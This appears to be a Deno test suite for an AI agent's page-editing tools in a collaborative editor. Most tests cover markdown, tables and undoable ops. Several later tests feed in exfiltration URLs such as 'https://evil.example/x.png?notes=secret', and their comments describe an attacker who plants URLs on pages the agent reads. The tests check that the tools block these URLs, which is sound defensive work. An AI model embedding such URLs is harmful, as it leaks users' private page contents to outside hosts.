import { assert, assertEquals } from "jsr:@std/assert@1";
import {
  type BlockSpec,
  deltaToMarkdown,
  isPageContent,
  markdownToDelta,
  MAX_SPEC_DEPTH,
  MAX_SPEC_NODES,
  type NodeJSON,
  type PageContent,
  pageViews,
  plainText,
  specToNode,
  tableRows,
} from "./blocks.ts";
import { applyOps, type Op, overwrites, PageEditSession, type ToolHooks } from "./tools.ts";
import { tokensToSegments } from "./segments.ts";

const hooks: ToolHooks = {
  readPage: (content) => Promise.resolve({ blocks: pageViews(content) }),
  createSubpage: (title) =>
    Promise.resolve({ id: "page-2", space_id: "space-1", parent_id: "page-1", title, sort_key: "a0" }),
  listPages: () => Promise.resolve([]),
  readOtherPage: () => Promise.resolve({}),
};

function para(id: string, text: string, children?: NodeJSON[]): NodeJSON {
  return { id, type: "paragraph", data: { delta: [{ insert: text }] }, ...(children ? { children } : {}) };
}

function sample(): PageContent {
  return {
    document: {
      id: "root",
      type: "page",
      children: [
        { id: "h1", type: "heading", data: { level: 2, delta: [{ insert: "Goals" }] } },
        {
          id: "l1",
          type: "bulleted_list",
          data: { delta: [{ insert: "Create pages" }] },
          children: [{ id: "l2", type: "bulleted_list", data: { delta: [{ insert: "nested" }] } }],
        },
        para("p1", "Offline editing"),
        para("p2", "Risks"),
      ],
    },
    meta: { v: 1, blocks: {}, deleted: {} },
  };
}

/** Structure only: ids, types and data, without meta timestamps. */
function shape(content: PageContent) {
  return content.document;
}

Deno.test("inline markdown round-trips through delta", () => {
  const src = "Ship **v1** with *offline* `drift`, [docs](https://example.com) and ~~old~~ snake_case";
  const delta = markdownToDelta(src);
  assertEquals(delta, [
    { insert: "Ship " },
    { insert: "v1", attributes: { bold: true } },
    { insert: " with " },
    { insert: "offline", attributes: { italic: true } },
    { insert: " " },
    { insert: "drift", attributes: { code: true } },
    { insert: ", " },
    { insert: "docs", attributes: { href: "https://example.com" } },
    { insert: " and " },
    { insert: "old", attributes: { strikethrough: true } },
    { insert: " snake_case" },
  ]);
  assertEquals(markdownToDelta(deltaToMarkdown(delta)), delta);
});

Deno.test("nested formatting, escapes and mentions", () => {
  assertEquals(markdownToDelta("**bold _and italic_**"), [
    { insert: "bold ", attributes: { bold: true } },
    { insert: "and italic", attributes: { bold: true, italic: true } },
  ]);
  assertEquals(markdownToDelta("2 \\* 3 = 6"), [{ insert: "2 * 3 = 6" }]);
  const mention = [{ insert: "@Mina Park", attributes: { mention: { kind: "user", id: "u1", name: "Mina Park" } } }];
  assertEquals(markdownToDelta(deltaToMarkdown(mention)), mention);
  const literal = [{ insert: "a * b and [x] _y_" }];
  assertEquals(markdownToDelta(deltaToMarkdown(literal)), literal);
});

Deno.test("tables use appflowy's col-major cell layout", () => {
  let n = 0;
  const node = specToNode({ type: "table", rows: [["Phase", "Risks"], ["Agents", "4"]] }, { newId: () => `id${n++}` });
  assertEquals(node.data?.colsLen, 2);
  assertEquals(node.data?.rowsLen, 2);
  assertEquals(
    node.children!.map((c) => [c.data?.colPosition, c.data?.rowPosition, c.children![0].type]),
    [[0, 0, "paragraph"], [0, 1, "paragraph"], [1, 0, "paragraph"], [1, 1, "paragraph"]],
  );
  assertEquals(tableRows(node), [["Phase", "Risks"], ["Agents", "4"]]);
});

Deno.test("edit session applies tools and records replayable ops", async () => {
  const session = new PageEditSession(sample(), hooks, {
    canEdit: true,
    crossPage: false,
    author: "Claude",
    now: () => 1000,
  });
  const inserted = await session.call(
    "insert_blocks",
    JSON.stringify({
      position: { after: "h1" },
      blocks: [
        { type: "paragraph", text: "Intro **text**" },
        {
          type: "chart",
          chart: { chart_type: "bar", title: "Risks", labels: ["A", "B"], series: [{ name: "n", values: [1, 4] }] },
        },
      ],
    }),
  );
  const ids = (inserted.result as { inserted_ids: string[] }).inserted_ids;
  assertEquals(ids.length, 2);
  assertEquals(inserted.summary, "Added 2 blocks");

  const replaced = await session.call("replace_block", {
    id: "p1",
    block: { type: "heading", level: 3, text: "Offline" },
  });
  assertEquals(replaced.result, { id: "p1" });
  const keptChildren = await session.call("replace_block", {
    id: "l1",
    block: { type: "todo_list", text: "Create pages" },
  });
  assertEquals(keptChildren.result, { id: "l1" });

  const moved = await session.call("move_block", { id: "p2", position: { before: "h1" } });
  assertEquals(moved.result, { id: "p2" });
  const nested = await session.call("move_block", { id: ids[0], position: { parent: "l1" } });
  assertEquals(nested.result, { id: ids[0] });

  const deleted = await session.call("delete_blocks", { ids: ["l2", ids[1]] });
  assertEquals(deleted.result, { deleted_ids: ["l2", ids[1]] });

  const top = session.content.document.children!.map((c) => c.id);
  assertEquals(top, ["p2", "h1", "l1", "p1"]);
  assertEquals(session.content.document.children![2].type, "todo_list");
  assertEquals(session.content.document.children![2].children!.map((c) => c.id), [ids[0]]);
  assertEquals(session.content.meta.deleted["l2"], 1000);
  assertEquals(session.content.meta.blocks["p1"], 1000);

  // Replaying the ops on the original page gives the same page (the client
  // applies streamed ops this way)…
  const replayed = applyOps(session.before, session.ops, 1000);
  assertEquals(shape(replayed), shape(session.content));

  // …and inverting them in reverse order gives the original back (Undo run).
  const inverse: Op[] = [];
  for (const op of [...session.ops].reverse()) {
    switch (op.op) {
      case "insert":
        inverse.push({ op: "delete", ids: op.nodes.map((n) => n.id), previous: [] });
        break;
      case "replace":
        inverse.push({ op: "replace", id: op.id, node: op.previous, previous: op.node });
        break;
      case "move":
        inverse.push({ op: "move", id: op.id, position: op.from, from: op.position });
        break;
      case "delete":
        for (const prev of [...op.previous].reverse()) {
          inverse.push({ op: "insert", position: prev.position, nodes: [prev.node] });
        }
        break;
    }
  }
  assertEquals(shape(applyOps(session.content, inverse, 2000)), shape(session.before));
});

Deno.test("a replace that kept children keeps the newer revision's children", async () => {
  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false, now: () => 1000 });
  await session.call("replace_block", { id: "l1", block: { type: "bulleted_list", text: "Create more pages" } });

  // Someone saved the page meanwhile: the child edited, another added.
  const latest = sample();
  const l1 = latest.document.children![1];
  l1.children![0].data = { delta: [{ insert: "nested, edited" }] };
  l1.children!.push({ id: "l3", type: "bulleted_list", data: { delta: [{ insert: "added" }] } });
  latest.meta.blocks = { l2: 500, l3: 500 };

  const out = applyOps(latest, session.ops, 2000);
  const block = out.document.children![1];
  assertEquals(block.data!.delta, [{ insert: "Create more pages" }]);
  assertEquals(block.children, l1.children);
  assertEquals(out.meta.blocks, { l1: 2000, l2: 500, l3: 500 });

  // Children given anew still replace the old ones.
  const fresh = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
  await fresh.call("replace_block", {
    id: "l1",
    block: { type: "bulleted_list", text: "Create pages", children: [{ type: "bulleted_list", text: "new" }] },
  });
  const children = applyOps(latest, fresh.ops).document.children![1].children!;
  assertEquals(children.map((c) => c.data!.delta), [[{ insert: "new" }]]);
});

Deno.test("invalid calls return errors and change nothing", async () => {
  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
  const cases: [string, unknown][] = [
    ["replace_block", { id: "nope", block: { type: "paragraph", text: "x" } }],
    ["insert_blocks", { position: { after: "h1", before: "p1" }, blocks: [{ type: "paragraph" }] }],
    ["insert_blocks", { position: { parent: "p1" }, blocks: [{ type: "paragraph" }] }],
    ["insert_blocks", { position: { at: "end" }, blocks: [{ type: "paragraph", children: [{ type: "paragraph" }] }] }],
    ["insert_blocks", { position: { at: "end" }, blocks: [{ type: "toggle" }] }],
    ["insert_blocks", {
      position: { at: "end" },
      blocks: [{
        type: "chart",
        chart: { chart_type: "bar", labels: ["a", "b"], series: [{ name: "s", values: [1] }] },
      }],
    }],
    ["move_block", { id: "l1", position: { after: "l2" } }],
    ["replace_block", { id: "l1", block: { type: "quote", text: "x" } }],
    ["list_pages", {}],
    ["nonexistent", {}],
  ];
  for (const [name, args] of cases) {
    const outcome = await session.call(name, args as Record<string, unknown>);
    assert((outcome.result as { error?: string }).error, `${name} should fail: ${JSON.stringify(args)}`);
    assertEquals(outcome.ops, []);
  }
  assertEquals(shape(session.content), shape(sample()));
  assertEquals((await session.call("read_page", "")).ops, []);

  const viewer = new PageEditSession(sample(), hooks, { canEdit: false, crossPage: true });
  const denied = await viewer.call("delete_blocks", { ids: ["p1"] });
  assert((denied.result as { error?: string }).error?.includes("view access"));
});

Deno.test("create_subpage records a create_page op", async () => {
  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false, now: () => 5 });
  const outcome = await session.call("create_subpage", { title: "Notes", blocks: [{ type: "paragraph", text: "hi" }] });
  assertEquals(outcome.result, { page_id: "page-2" });
  const op = outcome.ops[0] as Extract<Op, { op: "create_page" }>;
  assertEquals(op.page.title, "Notes");
  assertEquals(plainText(op.content), "hi");
  assertEquals(session.changed, false);
});

Deno.test("views flatten nesting and fold tables", () => {
  const content = sample();
  content.document.children!.push(
    specToNode({ type: "table", rows: [["a", "b"]] }, { newId: () => crypto.randomUUID() }),
  );
  const views = pageViews(content);
  assertEquals(views.map((v) => [v.id, v.depth, v.parent_id]).slice(0, 3), [
    ["h1", 0, undefined],
    ["l1", 0, undefined],
    ["l2", 1, "l1"],
  ]);
  assertEquals(views.at(-1)!.rows, [["a", "b"]]);
});

Deno.test("soniox tokens group into segments", () => {
  const segments = tokensToSegments([
    { text: "Hello", start_ms: 0, end_ms: 400, speaker: 1 },
    { text: " there.", start_ms: 400, end_ms: 3500, speaker: 1 },
    { text: " Next", start_ms: 3600, end_ms: 3900, speaker: 1 },
    { text: "你好", start_ms: 4000, end_ms: 4500, speaker: 2 },
  ]);
  assertEquals(segments, [
    { start_ms: 0, end_ms: 3500, text: "Hello there.", speaker: "1" },
    { start_ms: 3600, end_ms: 3900, text: "Next", speaker: "1" },
    { start_ms: 4000, end_ms: 4500, text: "你好", speaker: "2" },
  ]);
});

Deno.test("code blocks keep their code verbatim", () => {
  let n = 0;
  const code = 'func main() {\n\tfmt.Println("**hi**")\n}';
  const node = specToNode({ type: "code", text: code + "\n", language: "Golang" }, { newId: () => `id${n++}` });
  assertEquals(node.data, { delta: [{ insert: code }], language: "go" });
  const content: PageContent = {
    document: { id: "root", type: "page", children: [node] },
    meta: { v: 1, blocks: {}, deleted: {} },
  };
  const [view] = pageViews(content);
  assertEquals(view.text, code);
  assertEquals(view.language, "go");
  assertEquals(plainText(content), code);
  assertEquals(
    specToNode({ type: "code", language: "constructor" }, { newId: () => "x" }).data?.language,
    "constructor",
  );
});

Deno.test("callouts, toggles, videos, link cards, math and diagrams", () => {
  let n = 0;
  const opts = { newId: () => `id${n++}` };
  const toggle = specToNode({
    type: "toggle_list",
    text: "Details",
    collapsed: true,
    children: [{ type: "paragraph", text: "Hidden" }, { type: "code", text: "x" }],
  }, opts);
  assertEquals(toggle.data?.collapsed, true);
  assertEquals(toggle.children?.length, 2);
  assertEquals(specToNode({ type: "callout", text: "Careful", tone: "WARNING" }, opts).data?.tone, "warning");
  assertEquals(specToNode({ type: "callout", text: "x", tone: "loud" }, opts).data?.tone, "info");
  const video = specToNode({ type: "video", video: { url: "https://youtu.be/dQw4w9WgXcQ" } }, opts);
  assertEquals(video.data?.url, "https://youtu.be/dQw4w9WgXcQ");
  assertEquals(specToNode({ type: "link_preview", link: { url: "https://go.dev/doc" } }, opts).data, {
    url: "https://go.dev/doc",
  });
  assertEquals(specToNode({ type: "math_equation", formula: " e^{i\\pi}+1=0 " }, opts).data, {
    formula: "e^{i\\pi}+1=0",
  });
  assertEquals(specToNode({ type: "diagram", source: "\ngraph TD\n  A-->B\n" }, opts).data, {
    source: "graph TD\n  A-->B",
  });
  for (
    const bad of [
      { type: "video", video: { url: "https://example.com/v" } },
      { type: "link_preview", link: { url: "ftp://x" } },
      { type: "math_equation" },
      { type: "diagram", source: " " },
      { type: "callout", children: [{ type: "paragraph" }] },
    ]
  ) {
    let threw = false;
    try {
      specToNode(bad, opts);
    } catch {
      threw = true;
    }
    assert(threw, JSON.stringify(bad));
  }
  const content: PageContent = {
    document: { id: "root", type: "page", children: [toggle, video] },
    meta: { v: 1, blocks: {}, deleted: {} },
  };
  const views = pageViews(content);
  assertEquals(views.map((v) => v.type), ["toggle_list", "paragraph", "code", "video"]);
  assertEquals(views[0].collapsed, true);
  assertEquals(views[3].url, "https://youtu.be/dQw4w9WgXcQ");
});

Deno.test("a page mention reads and writes as a link to the page", () => {
  const delta = markdownToDelta("See [RFC: Sync v2](leaflet://page/p-9) first");
  assertEquals(delta[1], {
    insert: "RFC: Sync v2",
    attributes: {
      href: "leaflet://page/p-9",
      mention: { kind: "page", id: "p-9", name: "RFC: Sync v2" },
    },
  });
  assertEquals(deltaToMarkdown(delta), "See [RFC: Sync v2](leaflet://page/p-9) first");
});

Deno.test("a to-do keeps its due date", () => {
  const opts = { newId: () => crypto.randomUUID() };
  const node = specToNode({ type: "todo_list", text: "Send the draft", due: "2026-10-30" }, opts);
  assertEquals(node.data?.due, "2026-10-30");
  assertEquals(
    pageViews({ document: { type: "page", id: "root", children: [node] }, meta: { v: 1, blocks: {}, deleted: {} } })[0]
      .due,
    "2026-10-30",
  );
  const bad = specToNode({ type: "todo_list", text: "x", due: "Friday" }, opts);
  assertEquals(bad.data?.due, undefined);
});

Deno.test("embed and image blocks match the Go spec", () => {
  const embed = specToNode({ type: "embed", embed: { html: "<p>hi</p>" } }, { newId: () => "e", author: "Claude" });
  assertEquals(embed.data, { title: "Interactive embed", html: "<p>hi</p>", height: 320, author: "Claude" });
  const titled = specToNode({ type: "embed", embed: { html: "<p>hi</p>", title: "Timer", height: 50 } }, {
    newId: () => "e",
  });
  assertEquals(titled.data, { title: "Timer", html: "<p>hi</p>", height: 120, author: "" });
  const image = specToNode({ type: "image", image: { url: "https://example.com/a.png", alt: "A chart" } }, {
    newId: () => "i",
  });
  assertEquals(image.data, { url: "https://example.com/a.png", align: "center", alt: "A chart" });
  assertEquals(
    specToNode({ type: "image", image: { url: "https://example.com/a.png" } }, { newId: () => "i" }).data?.alt,
    "",
  );
});

Deno.test("a replay that replaces or deletes a block changed since is told apart", () => {
  const para = (id: string, text: string): NodeJSON => ({ id, type: "paragraph", data: { delta: [{ insert: text }] } });
  const page = (...children: NodeJSON[]): PageContent => ({
    document: { id: "root", type: "page", children },
    meta: { v: 1, blocks: {}, deleted: {} },
  });
  const read = para("p", "original");
  const replace: Op = { op: "replace", id: "p", previous: read, node: para("p", "agent edit") };
  const remove: Op = { op: "delete", ids: ["p"], previous: [{ node: read, position: { at: "end" } }] };
  const insert: Op = { op: "insert", position: { at: "end" }, nodes: [para("n", "new")] };
  // jsonb keeps no key order: the same block read back is the same.
  const reordered: NodeJSON = { data: { delta: [{ insert: "original" }] }, type: "paragraph", id: "p" };
  assert(!overwrites(page(reordered, para("q", "typed elsewhere")), [replace, insert]));
  assert(overwrites(page(para("p", "concurrent human edit")), [replace]));
  assert(overwrites(page(para("p", "concurrent human edit")), [remove]));
  // Only the agent's first op on a block has it as read.
  const again: Op = { op: "replace", id: "p", previous: para("p", "agent edit"), node: para("p", "agent edit 2") };
  assert(!overwrites(page(para("p", "original")), [replace, again]));
});

Deno.test("stored content is a page's only with its document, of a known version", () => {
  assert(!isPageContent(null));
  assert(!isPageContent({}));
  assert(!isPageContent({ document: null }));
  assert(!isPageContent({ document: { children: [] }, meta: { v: 2 } }));
  assert(
    isPageContent({ document: { id: "root", type: "page", children: [] }, meta: { v: 1, blocks: {}, deleted: {} } }),
  );
  assert(isPageContent({ document: { children: [] } }));
});

Deno.test("specs nest only so deep, and make only so many blocks per call", async () => {
  let n = 0;
  const nested = (depth: number): BlockSpec => {
    let spec: BlockSpec = { type: "bulleted_list", text: "leaf" };
    for (let i = 1; i < depth; i++) spec = { type: "bulleted_list", text: `level ${i}`, children: [spec] };
    return spec;
  };
  specToNode(nested(MAX_SPEC_DEPTH), { newId: () => `id${n++}` });
  let threw = false;
  try {
    specToNode(nested(MAX_SPEC_DEPTH + 1), { newId: () => `id${n++}` });
  } catch {
    threw = true;
  }
  assert(threw, "a spec nested too deep was made");
  threw = false;
  try {
    specToNode({ type: "bulleted_list", text: "x", children: "nope" as unknown as BlockSpec[] }, { newId: () => "x" });
  } catch {
    threw = true;
  }
  assert(threw, "children that are not an array were taken");

  // Within the 200 top-level blocks a call takes, nested ones count too.
  const wide: BlockSpec = {
    type: "bulleted_list",
    text: "x",
    children: Array.from({ length: Math.ceil(MAX_SPEC_NODES / 100) }, () => ({ type: "bulleted_list", text: "y" })),
  };
  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
  const outcome = await session.call("insert_blocks", { position: { at: "end" }, blocks: Array(100).fill(wide) });
  assert((outcome.result as { error?: string }).error?.includes("in all"), JSON.stringify(outcome.result));
  assertEquals(outcome.ops, []);
  assertEquals(shape(session.content), shape(sample()));
});

Deno.test("after reading another page, blocks that load a URL use only this page's or the request's", async () => {
  const content = sample();
  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
  const reading: ToolHooks = {
    ...hooks,
    readOtherPage: () =>
      Promise.resolve({ blocks: [{ id: "x", type: "paragraph", text: "see https://example.com/there.png for it" }] }),
  };
  const session = new PageEditSession(content, reading, {
    canEdit: true,
    crossPage: true,
    request: "Add the chart from https://example.com/asked.png",
  });
  const image = (url: string) => ({ type: "image", image: { url } });
  const end = { at: "end" };
  // Before reading another page, any URL goes.
  let outcome = await session.call("insert_blocks", { position: end, blocks: [image("https://a.example/1.png")] });
  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));

  await session.call("read_other_page", { page_id: "page-9" });
  for (const url of ["https://example.com/here.png", "https://example.com/asked.png"]) {
    outcome = await session.call("insert_blocks", { position: end, blocks: [image(url)] });
    assert(!(outcome.result as { error?: string }).error, `${url}: ${JSON.stringify(outcome.result)}`);
  }
  const leaks: [string, Record<string, unknown>][] = [
    // What the run wrote is not what it found, though it is on the page.
    ["insert_blocks", { position: end, blocks: [image("https://a.example/1.png")] }],
    // Only the page it read has this one: which of those it picked could
    // spell out what it read.
    ["insert_blocks", { position: end, blocks: [image("https://example.com/there.png")] }],
    ["insert_blocks", { position: end, blocks: [image("https://evil.example/x.png?notes=secret")] }],
    ["insert_blocks", {
      position: end,
      blocks: [{
        type: "bulleted_list",
        text: "x",
        children: [{ type: "link_preview", link: { url: "https://evil.example/" } }],
      }],
    }],
    ["replace_block", { id: "img", block: { type: "video", video: { url: "https://evil.example/v.mp4" } } }],
    ["create_subpage", { title: "Notes", blocks: [image("https://evil.example/y.png")] }],
  ];
  for (const [name, args] of leaks) {
    const before = structuredClone(shape(session.content));
    outcome = await session.call(name, args);
    const error = (outcome.result as { error?: string }).error;
    assert(error?.includes("Link to it in text instead"), JSON.stringify(outcome.result));
    assertEquals(outcome.ops, []);
    assertEquals(shape(session.content), before);
  }
  // Links in text stay free.
  outcome = await session.call("insert_blocks", {
    position: end,
    blocks: [{ type: "paragraph", text: "[x](https://evil.example/)" }],
  });
  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
});

Deno.test("URLs only on pages read do not count, however many there are", async () => {
  // Someone who can edit a page the agent reads puts a URL there for every
  // byte; one on this page as the run began still counts.
  const many = Array.from({ length: 256 }, (_, i) => `https://evil.example/${i}.png`);
  const content = sample();
  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
  const reading: ToolHooks = {
    ...hooks,
    readOtherPage: (id) =>
      Promise.resolve(
        id === "private"
          ? { blocks: [{ id: "s", type: "paragraph", text: "secret" }] }
          : { page: { id, title: many[0] }, blocks: many.map((u, i) => ({ id: `b${i}`, type: "image", url: u })) },
      ),
  };
  const session = new PageEditSession(content, reading, { canEdit: true, crossPage: true });
  await session.call("read_other_page", { page_id: "shared" });
  await session.call("read_other_page", { page_id: "private" });
  const image = (url: string) => ({ position: { at: "end" }, blocks: [{ type: "image", image: { url } }] });
  for (const url of [many[0], many[115], many[255]]) {
    const outcome = await session.call("insert_blocks", image(url));
    assert((outcome.result as { error?: string }).error?.includes("Link to it in text instead"), url);
  }
  const outcome = await session.call("insert_blocks", image("https://example.com/here.png"));
  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
});

Deno.test("URLs the run wrote stay unseen when it reads them back", async () => {
  const leak = "https://evil.example/x.png?d=secret";
  const written = { blocks: [{ id: "b", type: "paragraph", text: `[x](${leak})` }] };
  const reading: ToolHooks = {
    ...hooks,
    readOtherPage: (id) =>
      Promise.resolve(
        id === "private"
          ? { blocks: [{ id: "s", type: "paragraph", text: "secret" }] }
          // This page, as the store has it, lists the subpage the run made.
          : id === "page-1"
          ? { ...written, subpages: [{ id: "page-2", title: leak }] }
          : written,
      ),
  };
  const session = new PageEditSession(sample(), reading, { canEdit: true, crossPage: true });
  const image = { position: { at: "end" }, blocks: [{ type: "image", image: { url: leak } }] };
  await session.call("read_other_page", { page_id: "private" });
  const made = await session.call("create_subpage", {
    title: leak,
    blocks: [{ type: "paragraph", text: `[x](${leak})` }],
  });
  assert(!(made.result as { error?: string }).error, JSON.stringify(made.result));
  for (const id of ["page-2", "page-1"]) {
    await session.call("read_other_page", { page_id: id });
    const outcome = await session.call("insert_blocks", image);
    assert((outcome.result as { error?: string }).error, `read back from ${id}: ${JSON.stringify(outcome.result)}`);
  }
});

Deno.test("listing pages starts checking URLs", async () => {
  const content = sample();
  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
  const listing: ToolHooks = {
    ...hooks,
    listPages: () => Promise.resolve([{ id: "p", title: "Salary review", parent_id: null }]),
  };
  const session = new PageEditSession(content, listing, { canEdit: true, crossPage: true });
  await session.call("list_pages", {});
  const image = (url: string) => ({ position: { at: "end" }, blocks: [{ type: "image", image: { url } }] });
  let outcome = await session.call("insert_blocks", image("https://evil.example/x.png?t=Salary+review"));
  assert((outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
  outcome = await session.call("insert_blocks", image("https://example.com/here.png"));
  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
});

Deno.test("a replace with children: [] keeps the nested items", async () => {
  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
  let outcome = await session.call("replace_block", {
    id: "l1",
    block: { type: "bulleted_list", text: "Renamed", children: [] },
  });
  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
  assertEquals(session.content.document.children![1].children!.map((c) => c.id), ["l2"]);
  outcome = await session.call("replace_block", { id: "l1", block: { type: "paragraph", text: "Flat", children: [] } });
  assert((outcome.result as { error?: string }).error?.includes("nested"), JSON.stringify(outcome.result));
  assertEquals(session.content.document.children![1].children!.map((c) => c.id), ["l2"]);
});
